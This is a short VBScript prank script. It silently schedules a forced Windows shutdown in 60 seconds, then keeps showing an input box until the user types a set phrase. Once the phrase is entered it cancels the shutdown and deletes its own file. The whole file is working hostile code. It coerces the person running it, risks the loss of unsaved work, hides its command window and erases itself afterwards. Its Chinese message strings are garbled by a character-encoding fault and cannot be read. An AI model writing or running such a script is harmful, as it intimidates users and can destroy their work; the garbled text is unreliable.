On Error Resume Next
Dim WSHshellA
dim fso,f
Set WSHshellA = wscript.CreateObject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
WSHshellA.run "cmd.exe /c shutdown -s -t 60 -c ""�ܾ�������һ�����ڹػ�,��һ���ֶ�����,����mou��������"" ", 0, True
Dim a
Do While (a <> "���涫��")
a = InputBox("����.���涫��.�����,", "���涫��", "�ĸ������Ҿܾ�", 8000, 7000)
MsgBox Chr(13) + Chr(13) + Chr(13) + a, 0, "αװα�ض�"
Loop
MsgBox Chr(13) + Chr(13) + Chr(13) + "��������α�ض˲���Ǯ�ı�Ӧ,���涫��!"
WSHshella.run "cmd.exe /c shutdown -a"
f = fso.deletefile(wscript.scriptname)